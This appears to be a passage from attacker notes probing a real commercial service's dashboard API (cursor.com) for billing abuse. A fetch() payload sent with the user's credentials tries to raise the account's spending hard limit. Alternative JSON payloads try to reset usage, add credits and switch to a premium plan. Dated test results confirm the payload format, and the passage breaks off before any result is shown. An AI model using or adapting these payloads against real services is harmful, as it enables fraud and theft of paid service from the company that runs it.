## Potential Attack Vectors

This suggests the hard limit is stored in cents (e.g., $50.00 = 5000 cents).

## 5. Client Action Endpoint (NEW)

**Endpoint**: `/api/dashboard/client-action`

This is a **generic action endpoint** - naming pattern suggests it accepts different action types. High-value target for mass assignment.

### Test Payloads

```javascript
// Try different action types
fetch("https://cursor.com/api/dashboard/client-action", {
  method: "POST",
  headers: { "content-type": "application/json" },
  credentials: "include",
  body: JSON.stringify({ 
    action: "set-hard-limit",
    hardLimitCents: 9999999 
  })
}).then(r => r.text()).then(console.log);

// Alternative payload structures
{ "action": "update-usage", "used": 0 }
{ "action": "add-credits", "amount": 99999 }
{ "action": "set-plan", "plan": "ultra" }
{ "type": "set-hard-limit", "value": 99999 }
```

### Why This is Interesting

1. Generic action endpoints often have weaker validation
2. Accepts arbitrary `action` parameter - may expose internal APIs
3. Could be a single entry point for multiple operations (set limits, credits, etc.)

### Test Results (2026-03-17)

**Payload structure confirmed:** `{"action": "actionName", "args": {...}}`

**Working action (baseline):**
